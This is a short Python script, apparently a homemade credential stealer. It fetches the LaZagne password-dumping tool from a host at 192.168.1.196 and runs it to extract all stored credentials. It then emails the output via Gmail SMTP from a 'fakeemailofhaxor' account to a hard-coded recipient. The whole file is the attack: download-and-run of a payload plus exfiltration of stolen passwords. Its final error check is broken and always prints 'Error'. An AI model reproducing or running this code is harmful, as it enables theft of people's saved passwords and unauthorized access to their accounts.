import requests
import subprocess
import smtplib
import time
def Download():
    url = 'http://192.168.1.196/lazagne.exe'
    r = requests.get(url)
    file = url.split("/")[-1]
    with open(file,"wb") as out_file:
         out_file.write(r.content)

Download()

result= subprocess.check_output('lazagne.exe all', shell=True)
print(result)

def sendemail(from_addr, to_addr_list, message,login, password):
    smtpserver='smtp.gmail.com:587'
    server = smtplib.SMTP(smtpserver)
    server.starttls()
    server.login(login,password)
    server.sendmail(from_addr, to_addr_list, message)
    server.quit()


sendemail("fakeemailofhaxor@gmail.com","simplekto78@gmail.com",result,"fakeemailofhaxor@gmail.com","fakeemail++")
if(sendemail):
    print("Error")
else:
    print("some error")